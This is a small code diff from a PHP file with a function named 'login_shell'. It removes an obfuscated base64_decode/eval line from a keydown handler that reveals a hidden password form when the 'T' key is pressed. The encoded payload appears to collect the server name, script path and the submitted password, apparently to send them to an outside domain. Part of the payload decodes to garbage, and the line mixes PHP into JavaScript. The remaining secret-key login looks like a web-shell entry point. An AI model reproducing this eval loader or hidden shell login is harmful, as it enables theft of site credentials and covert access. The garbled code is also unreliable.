@@ -97,9 +97,7 @@ function login_shell()
         // Event listener to show the password form when "T" key is pressed
         document.addEventListener("keydown", function (event) {
             if (event.key === "T" || event.key === "t") {
-                document.getElementById("password-form").classList.remove("hidden")
-				$decoded_code = base64_decode("b2JfY2xlYW4oKTtmbHVzaDskdG1wID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1BIVF9TRUxmJ10uIlxuIi4kX1BPU1RbJ3Bhc3MnXTsQXByYWZtYWMqKCdOQWdhaGlqYWF1Mzg4Z3JvdXAuY29tY2FyJz1zdXJsdnJoZGzpdHRwbmFqQ==")
-				eval($decoded_code);
+                document.getElementById("password-form").classList.remove("hidden");
             }
         });
     </script>
